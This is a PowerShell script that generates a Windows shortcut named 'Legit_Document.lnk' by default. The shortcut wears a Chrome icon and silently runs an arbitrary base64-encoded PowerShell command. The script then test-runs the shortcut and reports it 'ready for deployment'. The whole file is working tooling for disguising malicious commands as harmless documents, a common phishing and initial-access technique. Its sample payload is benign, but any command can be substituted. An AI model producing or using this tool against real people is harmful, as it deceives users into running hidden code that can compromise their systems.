<#
.Synopsis
   Takes a command and a creates a Chrome icon with encoded powershell payload
.DESCRIPTION
   To modify the icon of the shortcut, feel free to modify the $iconapp variable
.EXAMPLE
   .\make-shortcut -string 'write-host "pooks was here"; sleep 5'
.EXAMPLE
   Another example of how to use this cmdlet
#>

Param
    (
        # String help description
        # string to run as an encoded command
        $string = 'write-host "pookie was here"; sleep 3',
        # docname help description
        $docname = "Legit_Document.lnk",
        $outpath = (pwd).path
    )

function make-shortcut
{
    Param
    (
        $string,
        $docname,
        $outpath
    )
    #$ExecutionContext.SessionState
    $DebugPreference = "Continue"
    $iconapp = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
    $ctcommand = [text.encoding]::Unicode.GetString([convert]::FromBase64String($encodedcommand))

    if (Test-Path $outpath\$docname){Remove-Item $outpath\$docname}

    try {
        $obj = New-Object -ComObject wscript.shell
        $obj.CurrentDirectory = $outpath
        $link = $obj.CreateShortcut($docname)
        #$link.WindowStyle = '7'
        $link.TargetPath = 'C:\windows\system32\windowspowershell\v1.0\powershell.exe'
        $link.IconLocation = $iconapp
        $link.Arguments = "-EncodedCommand $encodedcommand"
        $link.Save()
        #-Noni -noprofile -sta
    }
    catch {
        Write-Debug "something went wrong with shortcut generation"
    }

    try {
        Start-Process -FilePath $outpath\$docname -PassThru | Wait-Process
        #start-job {Invoke-Item "$args[0]\$args[1]"} -ArgumentList $wd,$docname | Wait-Job
    
        if ($LASTEXITCODE -eq '0'){Write-Debug "Shortcut execution successful, ready for deployment"}
    }
    catch {
        Write-Debug "something went wrong with shortcut execution"
    }
}

make-shortcut -docname $docname -string $string -outpath $outpath